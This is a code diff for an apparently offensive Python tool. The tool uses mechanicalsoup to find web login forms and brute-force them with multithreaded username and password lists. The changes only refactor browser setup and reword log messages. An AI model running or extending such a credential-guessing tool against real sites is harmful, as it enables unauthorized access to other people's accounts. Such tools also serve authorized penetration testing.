@@ -37,14 +37,9 @@ def getLoginForm(objBrowser):
       finally:
          return loginFields
 
-def createBrowser():
-   browser = mechanicalsoup.StatefulBrowser()
-   # SETTINGS HERE
-   return browser
-
 def check(url):
    # Check if url has login form
-   browser = createBrowser()
+   browser = mechanicalsoup.StatefulBrowser()
    try:
       browser.open(url)
       # OPENING URL, DEBUG MSG HERE
@@ -57,6 +52,7 @@ def check(url):
       return result
 
 def start(url, userlist, passlist, threads = 16):
+   print("[-] Start brute force method")
    def run_threads(threads):#, sending, completed, total):
       # Run threads
       for thread in threads:
@@ -77,7 +73,7 @@ def start(url, userlist, passlist, threads = 16):
             return True
 
       try:
-         browser = createBrowser()
+         browser = mechanicalsoup.StatefulBrowser()
          browser.open(url)
          # FILL FORM WITH VALUES
          browser.select_form(nr = formID)
@@ -97,7 +93,7 @@ def start(url, userlist, passlist, threads = 16):
       #    print("Found: [%s:%s]" %(username, password))
       #    break
       except Exception as error:
-         print(error)
+         print("[x] %s" %(error))
          # PRINT ERROR
          pass
       # ADD MORE CONDITION HERE
